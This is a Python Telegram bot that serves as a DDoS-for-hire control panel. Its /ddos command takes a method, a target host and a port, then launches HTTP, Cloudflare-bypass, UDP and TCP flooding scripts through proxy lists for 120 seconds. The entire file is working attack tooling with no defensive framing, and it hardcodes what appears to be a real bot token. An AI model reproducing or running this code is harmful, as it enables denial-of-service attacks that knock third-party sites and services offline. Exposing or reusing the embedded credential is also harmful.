import telebot
import threading
import subprocess
import time
import psutil
import datetime
import sqlite3

bot_token = '6906209180:AAFYoxSs82fub284FVcA-vqYMjIdpRdPOgs'
bot = telebot.TeleBot(bot_token)

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()

    while cmd_process.poll() is None:
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Attack command executed.")
                return
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['ddos'])
def attack_command(message):
    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please provide the correct syntax.\nExample: /ddos <method> <target>')
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Please provide the port as well.\nExample: /ddos <method> <ip> <port>')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    if method in ['HTTP-LOAD', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'HTTP-LOAD':
            command = ["node", "http", host, "120", "64", "8", "proxy.txt"]
            duration = 120
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "120", "64", "8", "proxy.txt"]
            duration = 120
        elif method == 'FLOOD':
            command = ["node", "flood.js", host, "120", "8", "proxy.txt", "64", "15"]
            duration = 120
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "udp.py", host, port, "120", "64", "35"]
            duration = 120
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "tcp.py", host, port, "120", "64", "35"]
            duration = 120

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'Attack initiated using method: {method}')
    else:
        bot.reply_to(message, 'Invalid attack method. Use /methods to see available methods.')

bot.infinity_polling(timeout=60, long_polling_timeout=1)
